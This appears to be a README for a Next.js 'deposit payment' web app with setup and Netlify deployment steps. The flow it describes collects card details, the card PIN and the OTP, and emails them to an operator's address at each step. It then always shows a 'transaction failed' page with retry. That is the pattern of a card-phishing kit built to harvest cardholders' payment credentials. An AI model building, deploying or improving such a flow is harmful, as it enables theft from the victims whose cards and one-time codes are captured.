# Deposit Payment App

A complete Next.js 14 application for handling deposit payments with multi-step verification.

## Features

- **Multi-step Payment Flow**: Amount entry → Payment details → PIN verification → OTP verification
- **Card Type Detection**: Automatically detects Visa, Mastercard, and Verve cards
- **Input Validation**: Numeric-only inputs with proper formatting
- **Email Notifications**: Sends detailed emails at each step using MailerSend API
- **Countdown Timer**: 7-minute OTP countdown with resend functionality
- **Responsive Design**: Mobile-first design using Tailwind CSS
- **Transaction Simulation**: Includes failure page with retry functionality

## Setup Instructions

### 1. Clone and Install

\`\`\`bash
git clone <your-repo-url>
cd deposit-payment-app
npm install
\`\`\`

### 2. Environment Variables

Create a `.env.local` file in the root directory:

\`\`\`env
MAILERSEND_API_TOKEN=your-mailersend-api-token
RECEIVER_EMAIL=admin@yoursite.com
\`\`\`

### 3. MailerSend Setup

1. Sign up for a MailerSend account at https://www.mailersend.com/
2. Create an API token:
   - Go to your MailerSend dashboard
   - Navigate to API Tokens
   - Create a new token with email sending permissions
   - Use this token as `MAILERSEND_API_TOKEN`

### 4. Development

\`\`\`bash
npm run dev
\`\`\`

Visit `http://localhost:3000` to see the application.

### 5. Deployment to Netlify

1. Push your code to GitHub
2. Connect your GitHub repo to Netlify
3. Set the following environment variables in Netlify:
   - `MAILERSEND_API_TOKEN`: Your MailerSend API token
   - `RECEIVER_EMAIL`: Email that should receive notifications

## Flow Overview

1. **Deposit Form** (`/`): Enter amount and email
2. **Payment Details** (`/payment`): Enter card information with type detection
3. **PIN Entry** (`/pin`): Enter 4-digit card PIN
4. **OTP Verification** (`/otp`): Enter OTP with 7-minute countdown
5. **Transaction Failed** (`/failed`): Retry functionality

## Email Notifications

The system sends detailed email notifications at two specific points:
- After PIN entry when "Proceed" is clicked
- After OTP entry when "Authorize" is clicked

## Technical Features

- **Next.js 14** with App Router
- **TypeScript** for type safety
- **Tailwind CSS** for styling
- **MailerSend API** for email sending
- **Session Storage** for flow state management
- **Responsive Design** matching the provided screenshots

## File Structure

\`\`\`
├── app/
│   ├── api/send-email/route.ts    # Email API endpoint
│   ├── payment/page.tsx           # Payment form
│   ├── pin/page.tsx              # PIN entry
│   ├── otp/page.tsx              # OTP verification
│   ├── failed/page.tsx           # Transaction failed
│   ├── layout.tsx                # Root layout
│   ├── page.tsx                  # Deposit form
│   └── globals.css               # Global styles
├── package.json
├── next.config.mjs
├── tailwind.config.js
└── tsconfig.json
\`\`\`

## Customization

- Modify email templates in `/app/api/send-email/route.ts`
- Adjust styling in `globals.css` and component files
- Update validation rules in individual page components
- Customize the transaction flow by modifying the routing logic
- 
